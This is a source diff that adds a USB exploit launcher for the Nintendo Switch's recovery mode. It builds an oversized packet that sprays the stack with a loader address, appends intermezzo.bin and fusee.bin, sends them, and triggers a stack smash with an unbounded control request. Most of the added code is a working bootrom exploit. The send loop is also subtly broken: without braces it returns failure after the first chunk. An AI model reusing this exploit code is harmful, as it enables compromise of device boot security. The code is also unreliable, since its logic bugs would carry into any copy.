@@ -16,6 +16,21 @@
 #define kNintendoSwitchVendorID 0x0955
 #define kNintendoSwitchProductID 0x7321
 
+#define USB_REQ_GET_STATUS 0x00
+#define USB_DIR_IN 0x80 /* to host */
+#define USB_RECIP_ENDPOINT 0x02
+
+#define TIMEOUT 1000 // milliseconds
+
+#define MAX_LENGTH 0x30298 // length of the exploit packet
+#define RCM_PAYLOAD_ADDR 0x40010000
+#define INTERMEZZO_LOCATION 0x4001F000
+#define PAYLOAD_LOAD_BLOCK 0x40020000
+#define SEND_CHUNK_SIZE 0x1000
+
+#define INTERMEZZO_PATH "intermezzo.bin"
+#define PAYLOAD_PATH "fusee.bin"
+
 struct USBNotification
 {
     void* this;
@@ -101,8 +116,8 @@ void DeviceAdded(void *userInfo, io_iterator_t iterator)
         
         [strings addObject:[NSString stringWithFormat:@"Device Name: %s", devName]];
         [strings addObject:[NSString stringWithFormat:@"Device Class: %s", className]];
-        [strings addObject:[NSString stringWithFormat:@"Device Plane: %s", pathName]];
-        [strings addObject:[NSString stringWithFormat:@"Device Path: %s", planeName]];
+        [strings addObject:[NSString stringWithFormat:@"Device Plane: %s", planeName]];
+        [strings addObject:[NSString stringWithFormat:@"Device Path: %s", pathName]];
         [strings addObject:[NSString stringWithFormat:@"VendorID: 0x%04X", vendorId]];
         [strings addObject:[NSString stringWithFormat:@"ProductID: 0x%04X", productId]];
         
@@ -159,6 +174,111 @@ void DeviceDisconnected(void *userInfo, io_service_t service, natural_t messageT
         void(^deviceCallback)(NSArray<NSString *> *info) = (typeof(deviceCallback))imp_getBlock((IMP)notificationInfo->deviceCallback);
         deviceCallback(@[@"Message Received"]);
     }
+}
+
+struct usb_ctrlrequest {
+    UInt8 bRequestType;
+    UInt8 bRequest;
+    UInt16 wValue;
+    UInt16 wIndex;
+    UInt16 wLength;
+    UInt32 timeout; /* in milliseconds */
+    void *data;
+};
+
+int control_transfer_unbounded(IOUSBDeviceInterface300** dev, UInt16 length)
+{
+    int buf_size = sizeof(struct usb_ctrlrequest) + length;
+    char *buffer = calloc(1, buf_size);
+    
+    struct usb_ctrlrequest *ctrl_req = (struct usb_ctrlrequest *) buffer;
+    ctrl_req->bRequestType = USB_DIR_IN | USB_RECIP_ENDPOINT;
+    ctrl_req->bRequest = USB_REQ_GET_STATUS;
+    ctrl_req->wLength = length;
+    
+    IOUSBDevRequest req;
+    req.bmRequestType = USBmakebmRequestType(kUSBIn, kUSBVendor, kUSBDevice);
+    req.bRequest = USB_REQ_GET_STATUS;
+    req.wValue = 0;
+    req.wIndex = 0;
+    req.wLength = buf_size;
+    req.pData = buffer;
+    req.wLenDone = 0;
+    
+    IOReturn rc = (*dev)->DeviceRequest(dev, &req);
+    
+    if(rc != kIOReturnSuccess)
+    {
+        return -1;
+    }
+    
+    //SMASHED THE STACK!?
+    
+    return req.wLenDone;
+}
+
+int buildAndRunPayload(IOUSBDeviceInterface300** dev, IOUSBInterfaceInterface300** interface)
+{
+    FILE *intermezzo_file;
+    FILE *payload_file;
+    char payload_buf[MAX_LENGTH]; // XXX: don't use more memory than we need, ~200k is a lot
+    int payload_idx = 0;
+    int payload_len;
+    
+    /* Begin payload construction */
+    // TODO: construct the payload on-the-fly as it is sent, saving memory
+    memset(payload_buf, 0, sizeof(payload_buf));
+    
+    *(uint32_t *)payload_buf = MAX_LENGTH;
+    payload_idx    = 680; // skip over the header
+    
+    /* fill the stack with the intermezzo address */
+    for (int i=RCM_PAYLOAD_ADDR; i<INTERMEZZO_LOCATION; i += 4, payload_idx += 4)
+        *(uint32_t *)&payload_buf[payload_idx] = INTERMEZZO_LOCATION;
+
+    char *bundlePath = [[[NSBundle mainBundle] resourcePath] UTF8String];
+
+    /* load intermezzo.bin */
+    if ((intermezzo_file = fopen(strcat(bundlePath, INTERMEZZO_PATH), "r")) == NULL) {
+        printf("[-] Failed to open " INTERMEZZO_PATH);
+        return -1;
+    }
+    
+    int intermezzo_len = fread(&payload_buf[payload_idx], 1, MAX_LENGTH - payload_idx, intermezzo_file);
+    fclose(intermezzo_file);
+    printf("[*] Read %d bytes from "INTERMEZZO_PATH"\n", intermezzo_len);
+    
+    /* pad until payload */
+    payload_idx += PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION;
+    
+    /* load the actual payload */
+    if ((payload_file = fopen(strcat(bundlePath, PAYLOAD_PATH), "r")) == NULL) {
+        printf("[-] Failed to open payload file");
+        return -1;
+    }
+    
+    int file_len = fread(&payload_buf[payload_idx], 1, MAX_LENGTH - payload_idx, payload_file);
+    payload_idx += file_len;
+    fclose(payload_file);
+    printf("[*] Read %d bytes of payload\n", file_len);
+    if (payload_idx == MAX_LENGTH)
+        printf("[*] Warning: payload may have been truncated. Continuing.");
+    
+    /* Send the payload */
+    payload_len = payload_idx;
+    int low_buffer = 1;
+    UInt8 pipe_ref = 1;
+    for (payload_idx = 0; payload_idx < payload_len || low_buffer; payload_idx += SEND_CHUNK_SIZE, low_buffer ^= 1) {
+        if((*interface)->WritePipe(interface, pipe_ref, &payload_buf[payload_idx], SEND_CHUNK_SIZE) != kIOReturnSuccess)
+            //if (ep_write(usb_fd, 1, &payload_buf[payload_idx], SEND_CHUNK_SIZE, TIMEOUT) != SEND_CHUNK_SIZE) {
+            printf("[-] Sending payload failed");
+        return -1;
+    }
+
+    printf("[+] Sent 0x%x bytes\n", payload_idx);
+    /* Smash the stack! */
+    printf("[+] Smashed the stack: %d\n", control_transfer_unbounded(dev, 0x7000));
+    return 0;
 }
 
 // Test writing to the Nintendo Switch's USB..
@@ -225,9 +345,7 @@ void WriteToUSB(struct USBNotification *notificationInfo, io_service_t usbDevice
                                         break;
                                 }
                                 
-                                //Testing..
-//                                char data[0] = {};
-//                                (*usbInterface)->WritePipe(usbInterface, pipe_ref, data, sizeof(data));
+                                buildAndRunPayload(deviceInterface, usbInterface);
                             }
                             
                             (*usbInterface)->Release(usbInterface);
